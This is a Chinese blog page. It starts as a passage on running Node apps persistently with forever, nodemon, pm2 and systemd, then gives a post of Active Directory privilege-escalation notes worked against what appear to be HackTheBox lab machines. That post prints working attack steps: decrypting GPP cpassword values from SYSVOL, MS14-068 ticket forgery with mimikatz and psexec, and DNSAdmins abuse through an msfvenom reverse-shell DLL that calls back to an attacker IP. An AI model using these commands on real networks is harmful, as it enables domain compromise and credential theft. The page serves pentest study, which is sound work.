session-name</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="八、Node-工具"><a href="#八、Node-工具" class="headerlink" title="八、Node 工具"></a>八、Node 工具</h2><p>对于 Node 应用来说，可以不用上面的方法，有一些专门用来启动的工具：<a target="_blank" rel="noopener" href="https://github.com/foreverjs/forever">forever</a>，<a target="_blank" rel="noopener" href="http://nodemon.io/">nodemon</a> 和 <a target="_blank" rel="noopener" href="http://pm2.keymetrics.io/">pm2</a>。</p>
<p>forever 的功能很简单，就是保证进程退出时，应用会自动重启。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 作为前台任务启动</span></span><br><span class="line">$ forever server.js</span><br><span class="line"></span><br><span class="line"><span class="comment"># 作为服务进程启动 </span></span><br><span class="line">$ forever start app.js</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止服务进程</span></span><br><span class="line">$ forever stop Id</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务进程</span></span><br><span class="line">$ forever restart Id</span><br><span class="line"></span><br><span class="line"><span class="comment"># 监视当前目录的文件变动，一有变动就重启</span></span><br><span class="line">$ forever -w server.js</span><br><span class="line"></span><br><span class="line"><span class="comment"># -m 参数指定最多重启次数</span></span><br><span class="line">$ forever -m 5 server.js </span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有进程</span></span><br><span class="line">$ forever list</span><br></pre></td></tr></table></figure>
</blockquote>
<p><code>nodemon</code>一般只在开发时使用，它最大的长处在于 watch 功能，一旦文件发生变化，就自动重启进程。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认监视当前目录的文件变化</span></span><br><span class="line">$ nodemon server.js</span><br><span class="line"></span><br><span class="line">＃ 监视指定文件的变化   </span><br><span class="line">$ nodemon --watch app --watch libs server.js  </span><br></pre></td></tr></table></figure>
</blockquote>
<p>pm2 的功能最强大，除了重启进程以外，还能实时收集日志和监控。</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动应用</span></span><br><span class="line">$ pm2 start app.js</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定同时起多少个进程（由CPU核心数决定），组成一个集群</span></span><br><span class="line">$ pm2 start app.js -i max</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有任务</span></span><br><span class="line">$ pm2 list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止指定任务</span></span><br><span class="line">$ pm2 stop 0</span><br><span class="line"></span><br><span class="line">＃ 重启指定任务</span><br><span class="line">$ pm2 restart 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除指定任务</span></span><br><span class="line">$ pm2 delete 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存当前的所有任务，以后可以恢复</span></span><br><span class="line">$ pm2 save</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出每个进程的统计数据</span></span><br><span class="line">$ pm2 monit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有日志</span></span><br><span class="line">$ pm2 logs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出数据</span></span><br><span class="line">$ pm2 dump</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启所有进程</span></span><br><span class="line">$ pm2 <span class="built_in">kill</span></span><br><span class="line">$ pm2 resurect</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动web界面 http://localhost:9615</span></span><br><span class="line">$ pm2 web</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="十、Systemd"><a href="#十、Systemd" class="headerlink" title="十、Systemd"></a>十、Systemd</h2><p>除了专用工具以外，Linux系统有自己的守护进程管理工具 Systemd 。它是操作系统的一部分，直接与内核交互，性能出色，功能极其强大。我们完全可以将程序交给 Systemd ，让系统统一管理，成为真正意义上的系统服务。</p>
<ul>
<li>登录<a target="_blank" rel="noopener" href="https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&from=20065">服务器</a>，<code>vim /etc/systemd/system/test.service </code></li>
<li>复制以下文件：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[<span class="title class_">Unit</span>]</span><br><span class="line"><span class="title class_">Description</span>=my-test</span><br><span class="line"># 在网络初始化之后启动</span><br><span class="line">#<span class="title class_">After</span>=network.<span class="property">target</span></span><br><span class="line"></span><br><span class="line">[<span class="title class_">Service</span>]</span><br><span class="line"># 服务类型</span><br><span class="line"><span class="title class_">Type</span>=simple</span><br><span class="line"># 进程退出立即重启</span><br><span class="line"><span class="title class_">Restart</span>=always</span><br><span class="line">#设置所属的用户和用户组，可选</span><br><span class="line"><span class="title class_">User</span>=crocodile</span><br><span class="line"><span class="title class_">Group</span>=crocodile</span><br><span class="line"></span><br><span class="line"># 启动命令</span><br><span class="line"><span class="title class_">ExecStart</span>=<span class="regexp">/bin/</span>bash /usr/local/cro/client.<span class="property">sh</span></span><br><span class="line">[<span class="title class_">Install</span>]</span><br><span class="line"># 当系统以多用户方式启动时，这个服务需要被自动运行</span><br><span class="line"><span class="title class_">WantedBy</span>=multi-user.<span class="property">targe</span></span><br></pre></td></tr></table></figure>

<p>复制</p>
<ul>
<li>保存好，然后执行<code>systectl daemon-reload</code>重新加载配置文件</li>
<li>再执行，<code>systemctl enable test.service</code>设置为开机启动</li>
<li><code>systemctl start test</code> (手动启动)</li>
</ul>
<p>如果启动失败，可以通过<code>journalctl -n 50</code>，查看最近50条的日志</p>
<p>守护进程（Daemon Process）和后台进程（Background Process）是两个不同的概念，虽然它们都在后台运行，但有一些关键的区别：</p>
<ol>
<li>目的和用途：<ul>
<li>监视进程：监视进程通常是为了提供系统服务、执行特定任务或监视进程而创建的。它们通常在系统启动时启动，独立于用户会话，并在整个系统运行期间一直存在其他。典型的监视进程包括网络服务（如HTTP服务器）、系统日志监控进程（如syslogd）等。</li>
<li>后台进程：后台进程是启动用户的进程，在用户终端会话之外运行。它们可能是由用户手动启动的，目的是在后台执行某个任务，但通常与用户会话相关，受用户的控制。例如，使用<code>&amp;</code>符号将一个进程置于后台执行。</li>
</ul>
</li>
<li>生命周期：<ul>
<li>监视进程：监视进程通常在系统启动时启动，并持续运行，直到系统关闭或被显式停止。它们独立于用户登录和注销，通常会占用用户干预。</li>
<li>后台进程：后台进程的生命周期通常与用户终止会话相关。它们在用户注销时通常会受到影响，会被终止或挂起。后台进程通常受用户控制，可以通过特定命令来启动、停止或暂停。</li>
</ul>
</li>
<li>与终端的关联：<ul>
<li>监视进程：监视进程通常与终端无关，不受终端会话的影响，通常会通过setsid()等方法分隔终端控制。</li>
<li>后台进程：后台进程通常仍然与用户终端会话相关，尽管它们在后台运行，但仍然可以通过终端控制。</li>
</ul>
</li>
</ol>
<p>总之，守护进程和后台进程都处于后台运行的进程，但它们的用途、生命周期和与终端的关联有所不同。守护进程通常是为系统服务或特定任务而设计的，而后台进程通常是为系统服务或特定任务而设计的。用户手动启动的，并受用户终端会话的影响。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://qwq0qwq.github.io/2023/10/10/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QWQ0QWQ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QWQ0QWQ's blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | QWQ0QWQ's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/10/10/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/" class="post-title-link" itemprop="url">域控提权</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2023-10-10 15:07:19 / Modified: 15:07:45" itemprop="dateCreated datePublished" datetime="2023-10-10T15:07:19+08:00">2023-10-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="0x01、前言"><a href="#0x01、前言" class="headerlink" title="0x01、前言"></a>0x01、前言</h1><p>菜鸡一枚，标题起的可能有点大，只是个人笔记整理的一个合集（所以基本每个例子都会有实例）。所以虽然说是合集，可能都没有囊括到各位大佬会的一半。还请各位大佬轻喷</p>
<h1 id="0x02、目录"><a href="#0x02、目录" class="headerlink" title="0x02、目录"></a>0x02、目录</h1><ol>
<li>GPP和SYSVOL中的密码</li>
<li>MS14-068</li>
<li>DNSAdmins</li>
<li>不安全的GPO权限</li>
<li>不安全的ACLs权限</li>
<li>Exchange</li>
<li>LLMNR&#x2F;NBT-NS 投毒</li>
<li>Kerberoasting</li>
<li>AD recyle Bin</li>
</ol>
<h1 id="0x03、-GPP和SYSVOL中的密码"><a href="#0x03、-GPP和SYSVOL中的密码" class="headerlink" title="0x03、 GPP和SYSVOL中的密码"></a>0x03、 GPP和SYSVOL中的密码</h1><p>什么是GPP:<br>GPP被用来将通用的本地管理员密码应用于所有工作站、应用全新的管理员帐户、为其他用户安排任务、应用打印机等用途<br>一般域内机子较多的情况，管理员为了方便管理，在主机上设置本地管理员密码GPP。配置此功能后，会在域控制器上创建一个XML文件，其中包含将策略应用于连接到域的工作站或便携式计算机时配置帐户所需的信息。<br>该xml文件包含管理帐户的密码，一般情况下任意域用户都可以读取（通常是DC开启SYSVOL目录共享）<br>这里不得不提的一点是Microsoft已使用AES加密了xml文件中的密码以提高安全性，但又发布了用于加密和解密该值的密钥（所以这是什么操作？？？）</p>
<p>漏洞利用：<br>接到域控制器的默认SYSVOL共享，并在其中搜索groups.xml的实例。如果存在这些文件，位于格式类似于以下的文件夹中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\active.local\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\Groups.xml</span><br></pre></td></tr></table></figure>

<h2 id="0x03-1、定位域控制器"><a href="#0x03-1、定位域控制器" class="headerlink" title="0x03.1、定位域控制器"></a>0x03.1、定位域控制器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set l   </span><br><span class="line">nltest /DSGETDC:</span><br><span class="line">echo %logonserver%</span><br><span class="line">net time /domain</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h2 id="0x03-2、查询DC共享目录"><a href="#0x03-2、查询DC共享目录" class="headerlink" title="0x03.2、查询DC共享目录"></a>0x03.2、查询DC共享目录</h2><p>使用enumlinux或者smbmap检查共享目录</p>
<p>smbmap -H 10.10.10.100 ###列出目标用户共享列表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">---- -----------</span><br><span class="line">ADMIN$ NO ACCESS</span><br><span class="line">C$ NO ACCESS</span><br><span class="line">IPC$ NO ACCESS</span><br><span class="line">NETLOGON NO ACCESS</span><br><span class="line">Replication READ ONLY</span><br><span class="line">SYSVOL NO ACCESS</span><br><span class="line">Users NO ACCESS</span><br></pre></td></tr></table></figure>

<h2 id="0x03-3、连接域共享"><a href="#0x03-3、连接域共享" class="headerlink" title="0x03.3、连接域共享"></a>0x03.3、连接域共享</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //active.local/Replication -N</span><br></pre></td></tr></table></figure>

<p>smb: \active.local\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups&gt; more Groups.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;Groups clsid=&quot;&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;&quot;&gt;&lt;User clsid=&quot;&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;&quot; name=&quot;active.local\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;&#123;EF57DA28-5F69-4530-A59E-AAB58578219D&#125;&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.local\SVC_TGS&quot;&gt;&lt;/Properties&gt;&lt;/User&gt;</span><br></pre></td></tr></table></figure>

<h2 id="0x03-4、使用gpprefdecrypt-py解密："><a href="#0x03-4、使用gpprefdecrypt-py解密：" class="headerlink" title="0x03.4、使用gpprefdecrypt.py解密："></a>0x03.4、使用<a target="_blank" rel="noopener" href="https://github.com/leonteale/pentestpackage/blob/master/">gpprefdecrypt.py</a>解密：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python gpprefdecrypt.py    edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</span><br></pre></td></tr></table></figure>

<h1 id="0x04、MS14-068"><a href="#0x04、MS14-068" class="headerlink" title="0x04、MS14-068"></a>0x04、MS14-068</h1><p>危害：任意域内用户都可以提权到域控</p>
<p>一般为本地账户才能成功，但是使用klist purge清除缓存证书可绕过限制</p>
<h2 id="0x04-1、漏洞成因"><a href="#0x04-1、漏洞成因" class="headerlink" title="0x04.1、漏洞成因"></a>0x04.1、漏洞成因</h2><p>在 KDC 对 PAC 进行验证时，根据协议规定必须是带有 server Hash、KDC Hash 的签名算法才可以（原本的设计是 HMAC 系列的 checksum 算法），但微软在实现上，却允许任意签名算法。只要客户端指定任意签名算法，KDC 就会使用指定的算法进行签名验证，致使导致恶意用户在发送给KDC的TG_REQ中可以创建包含管理员帐户成员身份的伪造PAC被KDC接收，并将其放入TG_REP中发布的新TGT票证中。该票证可用于向KDC要求服务票证的服务升级特权：在这种情况下，是smb服务票证。</p>
<p>什么是PAC（特权帐户证书）：<br>PAC包含域控制器（DC）提供的授权数据，Active Directory将授权数据存储在PAC（特权帐户证书）的票证字段中。<br>PAC由DC在服务单的现场授权数据中提供。它用KDC密钥（只有AD知道）签名，并用要验证的服务和AD之间共享的服务密钥签名。</p>
<h2 id="0x04-2、利用条件"><a href="#0x04-2、利用条件" class="headerlink" title="0x04.2、利用条件"></a>0x04.2、利用条件</h2><p>1.域控机器没有打漏洞补丁 补丁号：KB3011780<br>2.拥有一台域内机子及其sid</p>
<h2 id="0x04-3、漏洞利用漏洞检测-："><a href="#0x04-3、漏洞利用漏洞检测-：" class="headerlink" title="0x04.3、漏洞利用漏洞检测 ##："></a>0x04.3、漏洞利用漏洞检测 ##：</h2><p>FindSMB2UpTime.py(但是这个并不一定准确，因为域控是一般不会重启，但是也有存在意外重启的情况，那么即使有ms14-068也不会显示)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./FindSMB2UPTime.py 192.168.31.220</span><br><span class="line">DC is up since: 2013-12-28 22:24:25This DC is vulnerable to MS14-068</span><br></pre></td></tr></table></figure>

<p>获取域控制器补丁状态:Get-DCPatchStatus.ps1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># This is an example script only.</span><br><span class="line">import-module activedirectory</span><br><span class="line">[string]$KBNumber = &quot;KB3011780&quot;</span><br><span class="line">$DomainControllers = Get-ADDomainController -filter *</span><br><span class="line">[int]$DomainControllersCount = $DomainControllers.Count</span><br><span class="line">[int]$PatchedDCCount = 0</span><br><span class="line">[int]$UnPatchedDCCount = 0</span><br><span class="line">$UnpatchedDCs = @()</span><br><span class="line">Write-Output &quot;Scanning $DomainControllersCount Domain Controllers for patch $KBNumber&quot;</span><br><span class="line">ForEach ($DomainController in $DomainControllers)</span><br><span class="line">&#123;</span><br><span class="line">    $DomainControllerHostName = $DomainController.HostName</span><br><span class="line">    $PatchStatus = Get-HotFix -ID $KBNumber -ComputerName $DomainController.HostName -ErrorAction SilentlyContinue</span><br><span class="line"></span><br><span class="line">    IF ($PatchStatus.InstalledOn)</span><br><span class="line">        &#123;</span><br><span class="line">            $PatchStatusInstalledOn = $PatchStatus.InstalledOn</span><br><span class="line">            Write-Output &quot;$DomainControllerHostName patched on $PatchStatusInstalledOn&quot;</span><br><span class="line">            $PatchedDCCount++</span><br><span class="line">        &#125;</span><br><span class="line">    Else</span><br><span class="line">        &#123;</span><br><span class="line">            Write-Warning &quot;$DomainControllerHostName is NOT patched for $KBNumber (or could not be contacted)&quot;</span><br><span class="line">            [array]$UnpatchedDCs += $DomainController.HostName</span><br><span class="line">            $UnPatchedDCCount++</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">Write-Output &quot;Out of $DomainControllersCount DCs, Patched: $PatchedDCCount &amp; UnPatched: $UnPatchedDCCount &quot;</span><br><span class="line">IF ($UnpatchedDCs)</span><br><span class="line">&#123;</span><br><span class="line">    Write-Output &quot;The following DCs are NOT patched for $KBNumber&quot;</span><br><span class="line">    $UnpatchedDCs</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x04-4、环境描述："><a href="#0x04-4、环境描述：" class="headerlink" title="0x04.4、环境描述："></a>0x04.4、环境描述：</h2><p>目标机器：10.10.10.52 Windows Server 2008 R2 Standard<br>已获取：DC上的一个普通本地账户<br>james用户账户密码<br>james sid （可通过多种途径获取 rpclient：lookupnames james 目标机器shell中：<br>whoami &#x2F;all ，）<br>攻击机：kali 10.10.14.14 （不在域中）</p>
<p><strong>在Linux上利用：</strong>(有用户凭据、没有目标shell的情况下)<br>1.安装客户端，在客户端生成票证</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install krb5-user cifs-utils rdate</span><br></pre></td></tr></table></figure>

<p>2.编辑&#x2F;etc&#x2F;krb5.conf<br>[libdefaults]<br>default_realm &#x3D; HTB.LOCAL</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[realms]</span><br><span class="line">   HTB.LOCAL = &#123;</span><br><span class="line">    kdc = mantis.htb.local:88</span><br><span class="line">    admin_server = mantis.htb.local</span><br><span class="line">    default_domain = HTB.LOCAL</span><br><span class="line">    &#125;</span><br><span class="line">[domain_realm]</span><br><span class="line">    .domain.internal = HTB.LOCAL</span><br><span class="line">    domain.internal = HTB.LOCAL</span><br></pre></td></tr></table></figure>

<p>3.添加路由：编辑&#x2F;etc&#x2F;resolve.conf</p>
<p>nameserver 10.10.10.52</p>
<p>4.同步域控时间（确定DC的时间（用于票证同步），按照RFC必须在5分钟内完成，但+ -30分钟的偏差也可以的）</p>
<p>[方法1]net time -S 10.10.10.52 -U“” ##获取DC时间，然后收到设置本机时间<br>[方法2]sudo rdate -n 10.10.10.52 ###直接同步到域控时间</p>
<p>5.为james用户生成一张新的Kerberos票证</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kinit -V james@HTB.LOCAL       ###kinit中域名需要大写；或直接  kinit james    </span><br><span class="line">klist</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200503105149-08dae7fa-8ce9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200503105149-08dae7fa-8ce9-1.png" alt="img"></a></p>
<p>此时生成的是james的票证：访问C$是没有权限的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/tools/AD_Recon/pykek$ smbclient -W HTB.LOCAL //MANTIS/c$ -k</span><br><span class="line">tree connect failed: NT_STATUS_ACCESS_DENIED</span><br></pre></td></tr></table></figure>

<p>6.ms14-068生成高权限TGT票证</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200503105217-197f4d58-8ce9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200503105217-197f4d58-8ce9-1.png" alt="img"></a></p>
<p>7.替换低权限票证mv <a href="mailto:&#84;&#71;&#x54;&#x5f;&#x6a;&#97;&#109;&#x65;&#115;&#x40;&#x48;&#x54;&#x42;&#x2e;&#76;&#x4f;&#x43;&#65;&#x4c;&#x2e;&#x63;&#99;&#97;&#x63;&#104;&#x65;">&#84;&#71;&#x54;&#x5f;&#x6a;&#97;&#109;&#x65;&#115;&#x40;&#x48;&#x54;&#x42;&#x2e;&#76;&#x4f;&#x43;&#65;&#x4c;&#x2e;&#x63;&#99;&#97;&#x63;&#104;&#x65;</a> &#x2F;tmp&#x2F;krb5cc_1000</p>
<p>8.smb成功登录C$</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200503105226-1f4e367c-8ce9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200503105226-1f4e367c-8ce9-1.png" alt="img"></a></p>
<p><strong>Mimikatz利用</strong>：<br>先在目标机器使用ms14-068.exe生成票据，然后使用mimikatz注入票据，再使用psexec获取权限或winexec执行命令</p>
<p>ms14-068.py -u <a href="mailto:&#x6a;&#x61;&#x6d;&#101;&#115;&#64;&#72;&#x54;&#66;&#46;&#x4c;&#79;&#67;&#65;&#x4c;">&#x6a;&#x61;&#x6d;&#101;&#115;&#64;&#72;&#x54;&#66;&#46;&#x4c;&#79;&#67;&#65;&#x4c;</a> -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis</p>
<p>将<a href="mailto:&#84;&#x47;&#84;&#95;&#106;&#x61;&#x6d;&#101;&#115;&#x40;&#72;&#x54;&#66;&#46;&#x4c;&#79;&#67;&#65;&#76;&#x2e;&#x63;&#99;&#x61;&#99;&#104;&#101;">&#84;&#x47;&#84;&#95;&#106;&#x61;&#x6d;&#101;&#115;&#x40;&#72;&#x54;&#66;&#46;&#x4c;&#79;&#67;&#65;&#76;&#x2e;&#x63;&#99;&#x61;&#99;&#104;&#101;</a>文件放入mimikatz目录中<br>mimikatz.exe log “kerberos::ptc <a href="mailto:&#x54;&#71;&#84;&#95;&#106;&#97;&#x6d;&#x65;&#115;&#64;&#x48;&#84;&#66;&#x2e;&#76;&#x4f;&#x43;&#x41;&#76;&#46;&#x63;&#99;&#97;&#99;&#104;&#101;">&#x54;&#71;&#84;&#95;&#106;&#97;&#x6d;&#x65;&#115;&#64;&#x48;&#84;&#66;&#x2e;&#76;&#x4f;&#x43;&#x41;&#76;&#46;&#x63;&#99;&#97;&#99;&#104;&#101;</a>“<br>exit<br>注入成功即可获得域管理session,可以klist看一下是否有了kerberos Ticket<br>net use \htb.local\admin$ ####使用IP可能会失败<br>dir \htb.local\c$<br>psexec \htb.local cmd.exe</p>
<p>突破“本地账户才能漏洞利用”的限制：<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/56081.html">先 klist purgr清除缓存证书，再使用mimikatz生成高权限TGT的缓存证书进行连接：</a></p>
<p><strong>Impacket套件利用</strong><br>也有更简便的方法，不需要上边的种种配置，直接使用impacket套件下的GoldenPac一发入魂（ms14-068+psexec）<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200503105317-3dc72e38-8ce9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200503105317-3dc72e38-8ce9-1.png" alt="img"></a></p>
<h1 id="0x05、DNSAdmins"><a href="#0x05、DNSAdmins" class="headerlink" title="0x05、DNSAdmins"></a>0x05、DNSAdmins</h1><p>默认情况下，域控也是DNS服务器，微软的DNS服务器作为域控上的服务来运行。通过DNSadmins到System，拿下域控权限<br>利用条件：拥有DNSAdmins组成员的用户帐户权限，或者当前用户帐户具有对DNS服务器对象的写特权</p>
<p>whoami &#x2F;groups 查看用户组</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200503105516-849787c2-8ce9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200503105516-849787c2-8ce9-1.png" alt="img"></a></p>
<p>制作dll：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.67 LPORT=4444 --platform=windows -f dll &gt; plugin.dll</span><br></pre></td></tr></table></figure>

<p>开启smb共享：（可通过net use \10.10.14.67\tw 检测是否能连通smbserver ， 关于smbserver不能连接，排除网络问题之后，可能是共享占用问题，更改共享名称重新开启smbserver即可）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-smbserver tw.</span><br></pre></td></tr></table></figure>

<p>注入dll：<br>dnscmd.exe 10.10.10.169 &#x2F;config &#x2F;serverlevelplugindll \10.10.14.67\tw\plugin.dll</p>
<p>监听：<br>nc -lvvp 444</p>
<p>重启dns致使paylload生效：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sc.exe stop dns</span><br><span class="line">sc.exe start dns</span><br><span class="line">或</span><br><span class="line">sc.exe \\10.10.10.169 stop dns</span><br><span class="line">sc.exe \\10.10.10.169 start dns</span><br></pre></td></tr></table></figure>

